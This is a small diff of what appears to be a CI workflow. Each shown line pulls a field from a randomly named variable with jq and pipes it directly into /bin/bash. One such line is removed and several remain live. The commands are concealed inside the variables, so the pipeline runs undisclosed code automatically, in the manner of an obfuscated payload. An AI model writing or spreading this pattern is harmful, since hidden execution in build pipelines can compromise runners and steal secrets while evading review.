@@ -22,7 +22,6 @@ jobs:
           echo $cs2 | jq -r .miobt05 | /bin/bash
           echo $ev67 | jq -r .wn66023 | /bin/bash
           echo $yts64 | jq -r .ae9 | /bin/bash
-          printf '%s' "$ipbp9" | jq -r .kxght4 | /bin/bash
           printf '%s' "$ozekj5" | jq -r .cdubp83 | /bin/bash
           printf '%s' "$y431" | jq -r .zwx33139 | /bin/bash
           printf '%s' "$w8338" | jq -r .yajuh8144 | /bin/bash
